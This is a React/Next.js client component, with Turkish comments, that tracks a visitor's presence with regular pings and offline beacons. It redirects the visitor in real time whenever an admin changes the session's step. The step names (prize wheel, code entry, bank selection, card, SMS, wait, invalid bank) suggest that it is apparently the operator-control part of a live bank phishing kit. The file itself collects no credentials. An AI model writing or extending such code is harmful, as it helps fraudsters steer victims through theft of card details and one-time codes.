"use client";

import { useEffect } from "react";
import { usePathname } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { logAuditEvent } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

function shouldPauseBankListRedirects(pathname: string) {
  if (!pathname.startsWith("/banken")) return false;

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
  const pathname = usePathname();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);

  /* Presence: demo ortamında admin için online göstergesi — KESIN cozum (last_ping_at)
     - 15 snde bir sunucuya PING at (POST /api/session/ping, service-role)
     - Pagehide / visibility=hidden anında beacon + keepalive ile OFFLINE ping at (kesin gitsin)
     - Artık supabase anon status update + presence channel bugu onemsiz, karar last_ping_at'dan. */
  useEffect(() => {
    persistActiveSession(sessionId, effectiveRouteSessionId);

    const PING_INTERVAL = 15_000;

    const currentStep = (() => {
      if (pathname.startsWith("/wheel")) return "wheel";
      if (pathname.startsWith("/banken")) return "banken";
      if (pathname.startsWith("/special-approval")) return "special_approval";
      try {
        const p = pathname.replace(/^\/+/, "");
        const known = ["code_entry","win","bank","sms","card","wait","invalid_bank","congrats","live_support"];
        const first = p.split("/")[0];
        if (known.includes(first)) return first;
        return first || null;
      } catch { return null; }
    })();

    const buildBody = (status: "online" | "offline") => JSON.stringify({
      sessionId,
      publicId: effectiveRouteSessionId,
      pathname,
      currentStep,
      status,
    });

    const pingOnline = async () => {
      try {
        const resp = await fetch("/api/session/ping", {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: buildBody("online"),
        });
        // sessizce
        void resp;
      } catch { /* sessizce */ }
    };

    const pingOfflineOrOnline = (status: "offline" | "online") => {
      try {
        const payload = new Blob([buildBody(status)], { type: "application/json" });
        // ONCELIK 1: sendBeacon (tarayici sayfayi kapatsa bile kuyruga alir ve gonderir)
        if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
          try {
            const beaconOk = navigator.sendBeacon("/api/session/ping", payload);
            if (beaconOk) return;
          } catch { /* beacon hata, fallback */ }
        }
        // FALLBACK: fetch keepalive
        try {
          void fetch("/api/session/ping", {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: buildBody(status),
            keepalive: true,
          });
        } catch { /* ignore */ }
      } catch { /* ignore */ }
    };

    // Ilk mountta ONLINE ping + audit log
    void pingOnline();
    logAuditEvent({
      session_id: sessionId,
      public_id: effectiveRouteSessionId,
      event_kind: "presence",
      event_action: "session_mount_ping",
      pathname,
      meta: { effectiveRouteSessionId, ping_interval_ms: PING_INTERVAL, currentStep },
    });

    const t = window.setInterval(pingOnline, PING_INTERVAL);

    const markOffline = () => {
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "presence",
        event_action: "session_mark_offline_beacon",
        status: "warn",
        pathname,
      });
      pingOfflineOrOnline("offline");
    };

    const onVisibility = () => {
      if (document.visibilityState === "hidden") markOffline();
      else void pingOnline();
    };

    window.addEventListener("pagehide", markOffline);
    window.addEventListener("beforeunload", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      window.removeEventListener("beforeunload", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
      // Cleanup aninda da OFFLINE pingi (best effort)
      pingOfflineOrOnline("offline");
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* İlk yüklemede sunucu adımı ile senkron */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (shouldPauseBankListRedirects(pathname)) return;
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;
      const { data } = await supabase.from("sessions").select("current_step,status,form_data").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) return;
      const status = data.status as SessionStatus | undefined;
      if (status === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          window.location.href = "/special-approval";
        }
        return;
      }

      if (!data.current_step) return;
      const serverStep = data.current_step as SessionStep;
      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith("/wheel")) local = "wheel";

      if (local === "wheel" && serverStep === "code_entry") return;
      if (local === "banken" && serverStep === "bank") return;

      if (local && serverStep !== local) {
        const target = resolveStepTargetPath(
          serverStep,
          sessionId,
          effectiveRouteSessionId,
          (data.form_data ?? {}) as { bankSlug?: string | null },
        );
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "step",
          event_action: "server_step_redirect",
          from_step: local,
          to_step: serverStep,
          pathname,
          meta: { reason: "initial_sync" },
        });
        window.location.href = target;
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* Realtime: admin current_step değişince anında yönlendir */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channel = supabase
      .channel(`demo-session:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          if (shouldPauseBankListRedirects(pathname)) {
            return;
          }
          const next = payload.new as {
            current_step?: SessionStep;
            status?: SessionStatus;
            form_data?: { bankSlug?: string | null } | null;
          };
          if (next.status === "SPECIAL_INFO") {
            if (!pathname.startsWith("/special-approval")) {
              window.location.href = "/special-approval";
            }
            return;
          }

          if (!next.current_step) return;
          let local: string | null = pathToStep(pathname);
          if (pathname.startsWith("/wheel")) local = "wheel";

          if (local === "wheel" && next.current_step === "code_entry") return;
          if (local === "banken" && next.current_step === "bank") return;

          if (local && next.current_step !== local) {
            const target = resolveStepTargetPath(
              next.current_step,
              sessionId,
              effectiveRouteSessionId,
              (next.form_data ?? {}) as { bankSlug?: string | null },
            );
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "step",
              event_action: "admin_realtime_redirect",
              from_step: local,
              to_step: next.current_step,
              pathname,
              meta: { reason: "realtime_channel", status: next.status ?? null },
            });
            window.location.href = target;
          }
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  return null;
}
